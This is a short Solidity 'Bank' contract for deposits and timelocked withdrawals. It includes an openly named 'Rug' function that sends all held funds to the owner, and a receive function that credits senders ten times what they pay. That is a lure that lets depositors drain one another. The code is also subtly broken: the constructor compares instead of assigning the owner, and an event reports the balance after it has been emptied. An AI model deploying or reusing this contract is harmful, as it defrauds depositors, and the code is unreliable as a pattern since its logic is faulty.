//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract Bank {
    address payable public owner;
    mapping(address => uint256) deposits;
    event TransferEvent(address from, address to, uint256 amount);

    constructor() payable {
        owner == msg.sender;
        deposits[msg.sender] += msg.value;
    }

    function BalanceOf() external view returns (uint256) {
        return deposits[msg.sender];
    }

    function BankBalanceOf() external view returns (uint256) {
        return address(this).balance;
    }

    function Withdraw(uint256 amount) external {
        require(block.timestamp >= 1681552987, "Timelock::executeTransaction: Transaction hasn't surpassed time lock.");
        require(deposits[msg.sender] >= amount, "balance must enough");
        deposits[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    function Rug() external {
        require(owner == msg.sender, "caller must owner");
        owner.transfer(address(this).balance);
        emit TransferEvent(address(this), owner, address(this).balance);
    }

    receive() external payable {
        deposits[msg.sender] += msg.value * 10;
        emit TransferEvent(msg.sender, address(this), msg.value);
    }
}